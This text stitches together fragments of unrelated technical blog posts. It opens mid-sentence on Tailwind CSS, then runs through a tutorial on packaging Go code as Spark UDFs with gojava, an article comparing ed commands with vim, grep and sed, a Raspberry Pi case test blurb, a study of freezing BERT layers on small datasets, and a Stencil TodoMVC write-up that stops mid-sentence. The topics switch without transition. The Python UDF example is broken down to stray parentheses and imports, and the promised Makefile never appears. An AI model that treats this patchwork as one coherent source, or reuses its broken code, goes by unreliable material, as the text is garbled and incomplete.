ship.<sup id="fnref-1"><a href="https://mxstbr.com/thoughts/tailwind/#fn-1" color="blue">1</a></sup></p></li></ul><h3 font-family="system" font-size="4" font-weight="bold">Tailwind without the downsides</h3><p font-family="system" color="#333" font-size="18px">Brent Jackson, the creator of one of the original atomic CSS libraries, said it best in <a target="_blank" rel="noopener" to="https://jxnblk.com/blog/two-steps-forward/" href="https://jxnblk.com/blog/two-steps-forward/" color="blue">his post on atomic CSS</a>:</p><p font-family="system" color="#333" font-size="18px">“This methodology was created before React was released and was intended for use in template-based user interfaces, including Rails and PHP. It was never designed for functional component-based UI and doesn't take advantage of this new paradigm.”</p><p font-family="system" color="#333" font-size="18px">Now, here is the thing: you can have your cake and eat it too. You can use Tailwind's marvelous system and fantastic developer experience without the downsides of atomic CSS.</p><p font-family="system" color="#333" font-size="18px">Let me illustrate.

<p>Apache Spark is a perfect fit for processing large amounts of data. It’s not,&nbsp;
however, a perfect fit for our language stack at
<a href="https://community.com/">Community</a>. We are largely an Elixir shop with a solid
amount of Go, while Spark’s native stack is Scala but also has a Python API.
We’re not JVM people so we use the Python API—via the Databricks platform. For
most of our work, that’s just fine. But, what happens when you want to write a
custom user defined function (UDF) to do some heavy lifting? We could write new
code in Python, or… we could use our existing Go libraries to do the job! This
means we have to wrap up our Go code into a jar file that can be loaded into the
classpath for the Spark job. This is how to do that.</p>

<p>(Note that everything below could equally apply to UDAFs—aggregate functions)</p>

<h2 id="why-did-you-do-this-crazy-thing">Why Did You Do This Crazy Thing?</h2>

<p>You might be wondering how well this works. To put that issue to rest: it works
well and has been effective for us. That being established, let’s talk about
our use case. We have a large amount of data stored in a binary container
format that wraps Protobuf records, stored on AWS S3. Spark is great with S3,
but cannot natively read these files. Complicating things further, schemas for
the Protobuf records need to be kept up to date for all the tools that process
this data in anything but the most trivial way.</p>

<p>Over time we have built a set of battle-tested Go libraries that work on this
data. Furthermore, we already maintain tooling to keep the Protobuf schemas and
Go libraries up to date. It seems natural to leverage all of that goodness in
our Spark jobs:</p>

<ol>
  <li>Battle-tested libs that have been in production for awhile, with good tests.</li>
  <li>We already manage pipelines to keep the schemas up to date for the Go libs.</li>
</ol>

<p>Given the tradeoffs of reimplementing those libraries and the CI jobs, or
wrapping Go code up into jar files for use as Spark UDFs, we did the sane
thing!</p>

<h2 id="spark-udfs">Spark UDFs</h2>

<p>Spark is flexible and you can customize your jobs to handle just about any
scenario. One of the most re-useable ways to work with data in Spark is <a href="https://jaceklaskowski.gitbooks.io/mastering-spark-sql/content/spark-sql-udfs.html">user
defined functions
(UDFs)</a>.
These can be called directly inside Spark jobs or Spark SQL. In our case we use
a UDF to transform our custom binary input and Protobuf into something that
Spark more easily understands: JSON.</p>

<p>This means we can do something like this:</p>

<figure><pre><code data-lang="python"><span></span><span>import</span> <span>pyspark.sql.functions</span> <span>as</span> <span>F</span>
<span>import</span> <span>pyspark.sql.types</span> <span>as</span> <span>T</span>

<span>)</span>

<span>)</span>

<span># Continue working with the dataframe</span></code></pre></figure>

<p>By transforming the data into JSON, we get to work on something that is much
more native to Spark than Protobuf. Because we use the libraries that are
already maintained with up to date bindings, we don’t have to manage that
inside Spark itself. We only have to update our UDF in the jar loaded by the
job.</p>

<h2 id="building-a-spark-udf-in-go">Building a Spark UDF in Go</h2>

<p>Before we look too hard at anything else we need to get Go code into a wrapper that
lets us call it from Java. Then we’ll need to write a little Java glue to wrap
the Go code into the right types to make Spark happy when calling it. Luckily,
for this use case it’s all pretty simple.</p>

<h3 id="wrapping-go-code-into-a-java-library">Wrapping Go Code Into a Java Library</h3>

<p>First, we need some Go code to wrap. The library we talked about was built for
one purpose, but we need a little wrapper function to do just the part we need
to call from Spark. In our case we’ll take a single value from Spark and return
a single value back. Both of those values will be of type <code>[]byte</code> which makes
things really simple going between Go and Java, where this type interchanges
easily. I made a file called <code>spark_udf.go</code> that looks like this:</p>

<figure><pre><code data-lang="go"><span></span><span>package</span> <span>eventdecoder</span>

<span>import</span> <span>(</span>
        <span>"bytes"</span>
        <span>"compress/gzip"</span>
        <span>"io/ioutil"</span>

        <span>"github.com/company/yourlib"</span>
<span>)</span>

<span>func</span> <span>Decode</span><span>(</span><span>data</span> <span>[]</span><span>byte</span><span>)</span> <span>[]</span><span>byte</span> <span>{</span>
        <span>zReader</span><span>,</span> <span>err</span> <span>:=</span> <span>gzip</span><span>.</span><span>NewReader</span><span>(</span><span>bytes</span><span>.</span><span>NewReader</span><span>(</span><span>data</span><span>))</span>
        <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
                <span>// We return an error as the body!</span>
                <span>return</span> <span>[]</span><span>byte</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
        <span>}</span>

        <span>uncompressedData</span><span>,</span> <span>err</span> <span>:=</span> <span>ioutil</span><span>.</span><span>ReadAll</span><span>(</span><span>zReader</span><span>)</span>
        <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
                <span>// We return an error as the body!</span>
                <span>return</span> <span>[]</span><span>byte</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
        <span>}</span>

        <span>output</span><span>,</span> <span>_</span><span>,</span> <span>_</span><span>,</span> <span>err</span> <span>:=</span> <span>yourlib</span><span>.</span><span>DoSomeWork</span><span>(</span><span>uncompressedData</span><span>)</span> 

        <span>// Handle errors, etc</span>

        <span>return</span> <span>bytes</span><span>.</span><span>Join</span><span>(</span><span>output</span><span>,</span> <span>[]</span><span>byte</span><span>(</span><span>"\n"</span><span>))</span>
<span>}</span></code></pre></figure>

<p>Now that we have that, we need to get it into a jar file with all the bindings
that will let Java call into the Go function. As part of the <code>gomobile</code> efforts
to integrate Go with Android, there are some tools that will handle two way
wrappers between Java and Go.
<a href="https://godoc.org/golang.org/x/mobile/cmd/gobind"><code>gobind</code></a> will generate Java
bindings for exported functions in a Go module. You could start there and build
up the necessary tools to make this work. Sadly, it’s not at all trivial to get
it into a shape that will build nicely.</p>

<p>After messing around with it for awhile, I found a tool called
<a href="https://github.com/sridharv/gojava"><code>gojava</code></a> that wraps all the hard parts
from gobind into a single, easy to use tool. It’s not perfect: it does not
appear to be under active development, and does not support Go modules. But, it
makes life so much easier, and because none of this stuff changes that often,
the lack of active development isn’t much of a hindrance here. The ease of use
makes it worth it for us. Getting a working Java jar file is a single step:</p>

<figure><pre><code data-lang="shell"><span></span><span>JAVA_HOME</span><span>=</span>&lt;your_java_home&gt; <span>\</span>
        <span>GO111MODULE</span><span>=</span>off <span>\</span>
        gojava -v -o <span>`</span><span>pwd</span><span>`</span>/eventdecoder.jar build github.com/&lt;your_module_path&gt;</code></pre></figure>

<p>This will generate a file called <code>eventdecoder.jar</code> that contains your Go code
and the Java wrappers to call it. Great, right? If you are using Go modules,
just use <code>go mod vendor</code> before running <code>gojava</code> to make sure that you have all
your dependencies in a form that <code>gojava</code> can handle.</p>

<h3 id="adding-the-right-interface">Adding the Right Interface</h3>

<p>But we are not done yet. The Go code in the jar we built does not have the
right interface for a Spark UDF. So we need a little code to wrap it. You could
do this in Scala, but for us Java is more accessible, so I used that. Spark
UDFs can take up to 22 arguments and there are different interfaces defined for
each set of arguments, named <code>UDF1</code> through <code>UDF22</code>. In our case we only want
one input: the raw binary. So that means we’ll use the <code>UDF1</code> interface. Here’s
what the Java wrapper looks like:</p>

<figure><pre><code data-lang="java"><span></span><span>package</span> <span>com.community.EventsUDF</span><span>;</span>
<span>import</span> <span>org.apache.spark.sql.api.java.UDF1</span><span>;</span>
<span>import</span> <span>go.eventdecoder.Eventdecoder</span><span>;</span>

<span>public</span> <span>class</span> <span>Decoder</span> <span>implements</span> <span>UDF1</span><span>&lt;</span><span>byte</span><span>[],</span> <span>byte</span><span>[]&gt;</span> <span>{</span>
        <span>private</span> <span>static</span> <span>final</span> <span>long</span> <span>serialVersionUID</span> <span>=</span> <span>1L</span><span>;</span>

        <span>@Override</span>
        <span>public</span> <span>byte</span><span>[]</span> <span>call</span><span>(</span><span>byte</span><span>[]</span> <span>input</span><span>)</span> <span>throws</span> <span>Exception</span> <span>{</span>
				<span>// Call our Go code</span>
                <span>return</span> <span>Eventdecoder</span><span>.</span><span>Decode</span><span>(</span><span>input</span><span>);</span>
        <span>}</span>
<span>}</span></code></pre></figure>

<p>We stick that in our path following the expected Java layout. So if
<code>spark_udf.go</code> is in the current directory, below it we put the above files in
<code>java/com/community/EventsUDF/Decoder.java</code>. Note that this needs to match your
package name inside the Java source file.</p>

<h3 id="assembling-it">Assembling It</h3>

<p>We’re almost there! But, we need the Spark jar files that we’ll compile this
against. Our project has a <code>Makefile</code> (which I’ll share at the end of this
post) that downloads the correct jars and sticks them in <code>./spark_jars</code>. With
those being present, we can compile the Java code:</p>

<figure><pre><code data-lang="shell"><span></span>javac -cp <span>\</span>
	spark_jars/spark-core_<span>$(</span>VERSION<span>)</span>.jar:eventdecoder.jar:spark_jars/spark-sql_<span>$(</span>VERSION<span>)</span>.jar <span>\</span>
	java/com/community/EventsUDF/Decoder.java</code></pre></figure>

<p>With that compiled we can just add it to our Jar file and we’re ready to go!</p>

<figure><pre><code data-lang="shell"><span></span><span>cd</span> java <span>&amp;&amp;</span> jar uf ../eventdecoder.jar com/community/EventsUDF/*.class</code></pre></figure>

<p>That will update the jar file qnd insert our class. You can load that up into
Spark and call it as shown at the start of this post.</p>

<h2 id="important-notes">Important Notes</h2>

<p>You need to build this for the architecture where you will run your Spark job!
Spark may be in Scala, and we may have wrapped this stuff up into a Java jar,
but the code inside is still native binary. You may have some success with
<code>GOOS</code> and <code>GOARCH</code> settings, but it has not been repeatable for us with
<code>gojava</code>. We’ve built our UDFs that we use on Databricks’ platform under Ubuntu
18.04 with Go 1.14 and they work great.</p>

<p>Another gotcha that <a href="https://github.com/andrijaa">Aki Colović</a> found when
working with this stuff, is that your Go package <em>cannot contain an underscore</em>
or it makes the Java class loader unhappy. So don’t do that.</p>

<h2 id="a-makefile-to-make-it-simpler">A Makefile to Make it Simpler</h2>

<p>There were a few finicky steps above and this needs to be repeatable. So, I
built a <code>Makefile</code> to facilitate these UDF builds. It does all the important
steps in one go. As you will see below, we have cached the right versions of
the Spark jars in S3, but you can pull them from wherever you like. If you are
into Java build tools, feel free to use those.</p>

<p>The <code>Makefile</code> I wrote looks like this. You will likely have to make little
changes to make it work for you.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vim, sed and grep are three very popular command-line tools for Linux platforms. &nbsp;This article will attempt to explain the origins of these tools by showing how they use a number of syntax features that are <em><strong>identical</strong></em> to an equivalent command that uses <a href="https://blog.robertelder.org/paper-display-terminal-ed-vim/">the ancient 'ed' editor</a> which was written in the late 1960s.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For the purposes of demonstration, some example text (included at the end of this article) is contained in a file named 'lorem' which will be referenced by the commands found later in this article.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's say that we want to find all lines in the file 'lorem' that contain the sequence of letters 'que'. &nbsp;You can do that with grep using this command:</p>

<p><code><pre>grep "que" lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But, you could also do this by opening up the file 'lorem' with the 'ed' editor:</p>

<p><code><pre>ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This will bring you to the command prompt of 'ed' where it will wait until you type a command that's specific to the 'ed' editor. &nbsp;Typing the following 'ed' command:</p>

<p><code><pre>g/que/p
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will cause 'ed' to find all lines that contain 'que' and print them out, followed by returning to the 'ed' command prompt.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;We're now done working with 'ed' at this point, so we can type the 'q' command to exit, or just press Ctrl+d.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since we only wanted to use 'ed' for its ability to search for lines with matching text, we can make this process a bit faster by just echoing an 'ed' command and piping it directly into 'ed' like this:</p>

<p><code><pre>echo "g/que/p" | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The above command will open up 'ed' on the file 'lorem', search through the files and print the matching lines, and then exit back to the shell prompt for us. &nbsp;We now have a way to produce output that is effectively as what we get from grep, but with 'ed'. &nbsp;The only minor difference is the character count that 'ed' prints out to stderr, which could be separately piped to /dev/null to ignore it:</p>

<p><code><pre>echo "g/que/p" | ed lorem 2&gt;/dev/null
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since the last example was just a simple string search, you might assume the similarity is just a coincidence. &nbsp;However, this also works with most BRE-like regular expressions (the default regular expression type with grep). &nbsp;Here is a grep command that will search for all lines that contain a sequence of two 's' characters:</p>

<p><code><pre>grep "s\{2\}" lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And here is the same search, but using the 'ed' command instead:</p>

<p><code><pre>echo 'g/s\{2\}/p' | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since this pattern generalizes to most BRE-like regular expressions, you could use 're' to stand for 'Regular Expression' and the generic way of describing this use of ed would look like this:</p>

<p><code><pre>echo 'g/re/p' | ed lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Notice, the '<strong>g/re/p</strong>' part or '<strong>grep</strong>'. &nbsp;Yup, that's where the name comes from. &nbsp;This is described in detail by <a href="https://www.youtube.com/watch?v=NTfOnGZUZDk">Brian Kernighan in this YouTube video</a>. &nbsp;'grep' = the 'ed' command for 'Global Regular Expression Print'.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'grep' is not the only common Linux tool that has been influenced by 'ed'. &nbsp;'sed' is another example of a command-line tool where some of its syntax features can be <em>verbatim</em> copied into 'ed' to perform the same action. &nbsp;For example, here is a sed command that will find all lines in the file 'lorem' that contain a sequence of two 's' characters and replace them with two 't' characters. &nbsp;The result is then piped into the file '2' for later comparison:</p>

<p><code><pre>sed '1,$s/s\{2\}/tt/g' lorem &gt; 2
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And using a similar pattern as before, here is an echo statement that will use the exact same argument that we passed to 'sed', but as an 'ed' command:</p>

<p><code><pre>echo -e '1,$s/s\{2\}/tt/g'"\n"'1,$p' | ed lorem &gt; 1
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;One difference in the command above is that we need to also echo a newline followed by another 'ed' command to actually print out the current contents of the file from inside the 'ed' editor. &nbsp;In the case of 'sed', the string replacement will run on every line and then immediately output the result. &nbsp;With the 'ed' command version, we're basically just saying "Open the file 'lorem' with 'ed', run the replacement rule on all lines in the file to replace 'ss' with 'tt', then print out every line of the file, then exit".</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_grep-ed-compare_1646x854_q92.png" width="1646" height="854"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now that we've edited the file 'lorem' using two different methods, let's diff the two resulting files '1' and '2' to see if there are any differences:</p>

<p><code><pre>vim -d 1 2
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In my case, the above command shows no differences. &nbsp;It's not always the case that <em>every</em> 'sed' command will work exactly the same as an 'ed' command like this, but by now you should hopefully see the similarities.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comparing 'vim' with 'ed' is where things should really start to make sense. &nbsp;If you've used vim before, you've most likely typed 'Esc' followed by ':' more than a few times. &nbsp;What you probably didn't know is that those ':' commands are actually called 'Ex' commands. &nbsp;The cool thing is, you can actually run any 'Ex' command automatically as soon as you open up vim from the command-line by using the '-c' flag. &nbsp;For example, if you want to open up the file 'a' in vim and immediately delete lines 10-20, you can use this command:</p>

<p><code><pre>vim a -c '10,20d'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;similarly, you can use this command to open up vim and them immediately copy or 'transfer' lines 4 to 7 to after line 15 using this command:</p>

<p><code><pre>vim a -c '4,7t15'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You can also do the same thing with string replacement Ex commands. &nbsp;This will open up vim and immediately do a string replacement to replace 'Nunc' with 'ABC' on line 28:</p>

<p><code><pre>vim a -c '28s/Nunc/ABC/'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Don't forget that saving and quitting vim is an Ex command too! &nbsp;Therefore, you can do this to open up vim and exit it immediately:</p>

<p><code><pre>vim a -c 'wq'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Putting these all together gives us this vim command which opens vim, makes all 3 of the changes, then saves and quits. &nbsp;For the sake of example, the files 'a' and 'b' have the contents of the same 'lorem' file noted previously:</p>

<p><code><pre>vim a -c '10,20d' -c '4,7t15' -c '28s/Nunc/ABC/' -c 'wq'
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now, here's the punch line: &nbsp;The exact same operations can be done with the 'ed' editor using this command:</p>

<p><code><pre>echo -e '10,20d'"\n"'4,7t15'"\n"'28s/Nunc/ABC/'"\n"'wq' | ed b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The newlines in the command above are just to separate the individual 'ed' commands. &nbsp;If you were to do this without a pipe, you'd just open the file with 'ed' normally:</p>
<p><code><pre>ed b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and then enter the following ed commands one after another:</p>

<p><code><pre>10,20d
4,7t15
28s/Nunc/ABC/
wq
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Now, you can use vim to compare the two files 'a' and 'b' to see if they're the same:</p>

<p><code><pre>vim -d a b
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In my case, they're identical.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;There is more to say about 'ex' commands. &nbsp;In fact, if you check the man pages for vim, you'll find that there is a '-e' flag that says it will 'Start Vim in Ex mode, just like the executable was called "ex"'. &nbsp;That's interesting, let's try launching vim with the -e flag:</p>

<p><code><pre>vim -e lorem
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The result is something that looks like this:</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_vim-e_1163x211_q92.png" width="1163" height="211"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So clearly we're in vim, but we just have a command prompt that looks like the 'ed' editor. &nbsp;Let's try using an 'ed' command to print out all lines in the file and see what happens:</p>

<p><code><pre>1,$p
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Neat! &nbsp;It worked! &nbsp;So, the 'Ex' mode of vim is basically just an 'command-line interface' like editor that accepts 'Ex' commands, but really it's vim under the hood. &nbsp;It also happens to be the case that a lot (but not all) of the Ex commands are identical to 'ed' commands.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;When launching vim in 'Ex' mode, you can get back to regular visual mode by typing:</p>

<p><code><pre>visual
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;as an Ex command. &nbsp;To go the other way, from visual to 'Ex' mode, you can press Shift Q (not as an Ex command, just press it in visual mode):</p>

<p><code><pre>Q
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reflecting back on the 'ex' command that was mentioned earlier in the man page, you can try just running a program called 'ex' and see what happens. &nbsp;You'll get the same result as with vim -e. &nbsp;In fact, it's worth checking if 'ex' is a symlink to something...</p>

<p><img src="https://blog.robertelder.org/images/vim-sed-grep-ed-commands_which-ex_1580x308_q92.png" width="1580" height="308"></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So, to re-visit the question in the title of this article: "Can you use the 'ed' editor as a drop-in replacement for vim, grep &amp; sed?" &nbsp;It wouldn't really be fair to answer 'Yes' to this question: &nbsp;The commands here were chosen because they are good examples of syntax that is identical between the two context, however it isn't that hard to find a few counter-examples where it doesn't quite work. &nbsp;For example, things like cutting and pasting are different between 'ed' and vim, and some of the range syntax that sed accepts is not accepted by 'ed', however the overall similarities are still there. &nbsp;Having said this, the answer to this question isn't quite 'No' either: &nbsp;Depending on what you want to accomplish with vim/grep/sed, you may actually be able to get away with using an identical (or very similar) command in the 'ed' editor as demonstrated in this article.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In the end, the purpose of this article is not to convince you that all of the features in vim/grep/sed are exactly replicated in 'ed', but rather to show how these common Unix tools have a lot more in common than most people realize.</p>

					<div><p>During the research, the Raspberry Pi 4 will be placed in the innovative MaticBox case – a multifunctional and budget case for Raspberry Pi and Asus ThinkerBoard. It’s many features allow easy implementation of projects in home and industrial environments, with good cooling, mounting anywhere and including the ability to stack server clusters of single-board computers Raspberry Pi.</p><p>Learn more about MaticBox here: <span><a href="https://leapmatic.com/maticbox4/">https://leapmatic.com/maticbox4/</a></span><br>Or you can buy here: <span><a href="https://leapmatic.com/product/maticbox-4-innovative-case-for-raspberry-pi-4/">https://leapmatic.com/product/maticbox-4-innovative-case-for-raspberry-pi-4/</a></span></p><p>For easier presentation of the results, we will use the measurement application – MaticControl&nbsp;<span>developed by us</span><span>&nbsp;</span><span>. Through it we set the type and time of CPU load. On the graphs you can observe the internal temperature of the processor, as well as the frequencies of the cores. For such studies, we will load the processor 100% for 10 minutes.</span></p><p>The fan noise is measured with a special device designed for this purpose on a dBA scale. As dB is not always a clear unit of measurement for the user, we also provide sound recordings to give you an idea of the type of sound and for comparison. It is important to note that the noise is measured and recorded in an ordinary office room measuring 3.5m x 4.5m, with windows to a relatively quiet part of the city, so the background noise is in the range of 30dBA</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p><span>S</span>ince the advent of the Transformer architecture (Vaswani et al. 2017) and of BERT models (Devlin et al. 2019), Transformer models have become ubiquitous in NLP, achieving SOTA results on most NLP datasets.</p>
<p>Before Sesame Street puppets flooded on ArXiv, the de-facto method to train an NLP model leveraged word embeddings pre-trained using Glove or word2vec. These word embeddings were used to initialize the first embedding layer of your model, and you just had to plug the rest of your architecture above this first layer.</p>
<p>Nowadays, it’s increasingly common to use BERT-like language models trained on vast amounts of unlabeled text, and fine-tune the model on task-specific data. This change of paradigm led to a new subfield in NLP called BERTology which studies the ins and outs of BERT-like models.</p>
<p>Many hyper-parameters of BERT — such as the number of attention heads or the learning rate to use — have been studied, but few papers looked at how layer freezing affects performances.  Freezing layers means disabling gradient computation and backpropagation for the weights of these layers. This is a common technique in NLP or Computer Vision when working on small datasets as it usually reduces the chances of your model to overfit. Usually, models are frozen from bottom to top, as the first layers of neural networks are thought to encode universal features while the top layers are more task-specific. Another advantage of freezing is that it provides a nice speed boost and reduced memory usage during training.</p>
<p>Most machine learning teams in industry don’t have access to high-quality and domain-specific datasets. As the costs of building custom datasets are high, these datasets are usually way smaller than those often used in academia. Learning how to train better models with fewer data is a major concern, especially in industry. While the effect of freezing on performance has been explored (Lee, Tang, and Lin 2019), the low-resource setting hasn’t attracted much attention yet. Luckily, it’s what this post is all about 😎</p>

<p>To test how freezing affects performances when data is scarce, we will use the now popular <a href="https://github.com/huggingface/transformers" target="_blank" rel="noopener">🤗 Transformers library</a> from Hugging Face to train a RoBERTa model (base version) on two standard binary classification datasets from the GLUE benchmark: SST-2 (Stanford Sentiment Treebank) and CoLA (Corpus of Linguistic Acceptability).</p>
<p>SST-2 is a sentiment analysis task and CoLA a dataset containing sentences labeled with respect to their grammatical acceptability (i.e whether each sentence is grammatically correct or not). SST-2 and CoLA contain ~51% and ~69% of positive samples respectively in their validation set, which gives us a majority class baseline to compare to. We will use accuracy as the metric of evaluation for both datasets.</p>
<p>We will train models with a subset of the training dataset and evaluate on the whole validation dataset. For CoLA and SST-2, we generate subsets of size 50, 100, 200, 500, and 1000, by:</p>
<ul>
<li>taking care that the fraction of positive samples is the same as in the original train dataset (stratify splitting)</li>
<li>generating the splits by increasing size (50, 100, 200, 500, 1000) and reusing all samples from the previous split. By doing so, we limit the variability coming from using different samples in each split.</li>
</ul>
<p>To assess the impact of layer freezing on performances, 0, 2, 4, 8, 10, or 12 encoder layers were frozen. I also tested to only freeze the embedding layers (frozen layers = -1).</p>
<p>Similar to the original RoBERTa paper (Liu et al. 2019), I fine-tuned for 10 epochs with a linear warmup of 1 epoch followed by a linear decay to zero. As my computational budget was limited, I didn’t perform any hyper-parameter search and stuck to the default values (<code>lr = 5e-5</code>, AdamW optimizer).</p>
<p>On both datasets, for each layer freezing value (-1, 0, 2, 4, 8, 10, 12) and for each train size (50, 100, 200, 500, 1000), 5 replicates were trained with a different random seed.</p>
<p>I decided to use the recent (and pretty awesome!) <a href="https://github.com/huggingface/datasets" target="_blank" rel="noopener">🤗Datasets</a> library — also developed by folks from Hugging Face — to easily fetch and process these two datasets:</p>

<p>Here comes the most interesting part!</p>
<p>Below is displayed for both datasets the best accuracy obtained during training on the development set for all train sizes and all numbers of frozen layers. Each red dot on the plot represents a single run.</p>
<p>The complete results can also be found as tables at the end of the post.</p>
<p><img src="https://raphaelb.org/img/freezing-bert/sst2.png" alt="Results on SST-2"></p>
<p><em>SST-2: Best accuracy during training on development set</em></p>
<p><img src="https://raphaelb.org/img/freezing-bert/cola.png" alt="Results on CoLA"></p>
<p><em>CoLA: Best accuracy during training on development set</em></p>
<p>As expected, having more data always help: we gain +0.15 (0.75 → 0.90) in accuracy by increasing dataset size from 50 to 1000 for SST-2.</p>
<p>Freezing all (12) layers of the encoder is definitely not a good idea when dealing with limited data: there is always a significant performance drop, and the resulting models are barely better than a majority class classifier. Freezing 10 layers is also associated with degraded accuracy, even if the effect isn’t as strong. Aside from 10- and 12-frozen layers, there are no clear impact of layer freezing on performances.</p>
<p>We also observe high variability in accuracy between runs with the same settings (but with different random seeds). This instability is known since the release of BERT. While catastrophic forgetting and the small sizes of datasets were first suspected as the causes of this instability, more recent work (Mosbach et al. 2020) suggests that optimization difficulties leading to vanishing gradients are the actual reasons. For both SST-2 and CoLA datasets, there are no clear evidence that freezing reduces these instabilities.</p>
<p>As a final note, the performance gap between SST-2 and CoLA with 50 examples is interesting: while best models for SST-2 classify 82% of samples correctly (with 51% of positive samples), best run are barely better than the majority class baseline with 70% of samples correctly classified. This is indicative of the inductive bias of these models, which are more prone to detect polarity than grammatical correctness.</p>

<p>And that’s all for this second post 😊!</p>
<p>The results of these experiments were surprising to me, I initially thought layer freezing would have a more visible impact on performances.</p>

It lists ~30 libraries for creating web components, comparing code style, performance and bundle size. One of the libraries got me intrigued - Stencil - which looks very promising and has lots of stars on GitHub - about 8.6k.</span></span></p><p id="viewer-m0td"><span><a href="https://stenciljs.com/" target="_blank" rel="noopener"><span><u>Stencil</u></span></a><span> is a React-inspired web component library. It is using the same JSX as React and some of the same concepts (Render function, props, state). However, Stencil differs as it compiles to an optimal bundle, creating Virtual DOM that is consolidated directly into the DOM itself (no VDOM to VDOM comparison). The result is standard web components with optimal performance.</span></span></p><p id="viewer-876ce"><span><span>On top, Stencil provides good development experience through their template applications - for building a component, a website / app or a PWA. Stencil also supports server-side rendering and hydrations for websites that need to be optimized for indexing.</span></span></p><p id="viewer-4f7v9"><span><span>To learn Stencil, we decided to build yet another version of </span><a href="http://todomvc.com/" target="_blank" rel="noopener"><span><u>TodoMVC</u></span></a><span>. TodoMVC is a great platform to compare different javascript libraries - it </span>exposes<span> 54 Javascript UI libraries on one simple use case - a Todo list application. Each application has to look exactly the same, with the same functionality - adding a todo item, marking an item as complete, removing completed items, etc. Every instance of the application needs to be persistent with local storage and feature routing for display all, active or completed todos, and so on. </span></span></p><p id="viewer-5ab1d"><span><span>Here is an example of a TodoMVC application:</span></span></p><div id="viewer-9kpfo"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_451dfe597f8c4a3e99ebd9013facd90f~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_451dfe597f8c4a3e99ebd9013facd90f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-5isi0"><span><span>In this article we share what we’ve learned from building a TodoMVC application using Stencil.</span></span></p><p id="viewer-7pffh"><span><span>Our finished copy of the complete Stencil TodoMVC application is on GithuB: </span></span></p><ul><li id="viewer-2ajfe"><p><span>Github pages - </span><a href="https://yoavaa.github.io/stencil-todo-mvc/" target="_blank" rel="noopener"><span><u>demo</u></span></a> </p></li><li id="viewer-504l8"><p><span>Github </span><a href="https://github.com/yoavaa/stencil-todo-mvc" target="_blank" rel="noopener"><span><u>repo</u></span></a> </p></li><li id="viewer-6isa4"><p><span>Pull request for TodoMVC is </span><a href="https://github.com/tastejs/todomvc/pull/2130" target="_blank" rel="noopener"><span><u>here</u></span></a><span>.</span></p></li></ul><p id="viewer-df9em"><span><span>Here’s an equivalent React TodoMVC application for reference:</span></span></p><ul><li id="viewer-e9k4l"><p><a href="http://todomvc.com/examples/react/#/" target="_blank" rel="noopener"><span><u>TodoMVC React Example</u></span></a></p></li></ul><p id="viewer-ce1qk"><span><span>Just for the fun of it, we also added a </span><a href="https://svelte.dev/" target="_blank" rel="noopener"><span><u>Svelte</u></span></a><span> TodoMVC application for the performance comparison</span></span></p><ul><li id="viewer-acl7k"><p><a href="http://svelte-todomvc.surge.sh/" target="_blank" rel="noopener"><span><u>Svelte TodoMVC Example</u></span></a></p></li></ul><p id="viewer-8a90"><span><span>A side note on 